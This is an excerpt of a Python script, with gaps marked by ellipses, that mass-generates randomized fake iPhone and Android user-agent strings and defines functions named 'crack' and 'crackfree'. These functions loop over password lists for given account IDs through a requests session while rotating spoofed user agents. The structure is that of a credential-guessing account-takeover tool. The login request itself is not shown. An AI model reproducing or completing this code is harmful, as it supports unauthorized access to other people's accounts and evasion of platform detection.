...
for xd in range(10000):
	a='Mozilla/5.0 (iPhone14,3; U;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPU iPhone'
	e=random.randrange(100, 9999)
	f='OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile/19A346 Safari/602.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android 4.3'
	...
	l='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; U; Android 2.2.1'
	...
	i='; en-us; Nexus One Build/FRG83)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
...
def grup():
	...
	ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930V Build/R16NW)'
...
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua = random.choice(['Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)'])
	'Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36'
	'Mozilla/5.0 (Linux; Android 13; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36'
...
def crackfree(idf,pwv):
	...
	sys.stdout.flush()
	ua = random.choice(['Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S8600/S8600XXKJD; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/3.0 Mobile WVGA SMM-MMS/1.2.0 OPN-B'])
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
